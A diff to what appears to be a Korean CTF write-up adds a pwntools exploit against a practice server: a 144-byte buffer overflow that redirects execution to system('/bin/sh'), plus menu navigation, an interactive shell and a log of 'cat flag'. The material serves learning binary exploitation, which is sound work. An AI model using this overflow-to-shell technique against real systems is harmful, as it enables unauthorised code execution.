@@ -190,6 +190,25 @@ p = remote('ctf.j0n9hyun.xyz', 3010)
 # materials for exploit
 system_addr = 0x80485b0
 binsh = 0x8048eb1
+
+# payload setup
+payload = ''
+payload += 'A'*144
+payload += p32(system_addr)
+payload += 'AAAA'    
+payload += p32(binsh)
+
+# access to "case 5:"
+p.recvuntil('>>> ')
+p.sendline('5')
+log.info('send 5')
+
+# send the payload
+p.recvuntil('> ')
+p.sendline(payload)
+log.info('send payload')
+
+p.interactive()
 ```
 
 
@@ -243,3 +262,4 @@ $ cat flag
 [DEBUG] Sent 0x9 bytes:
     'cat flag\n'
 ```
+~~flag는 비공개~~
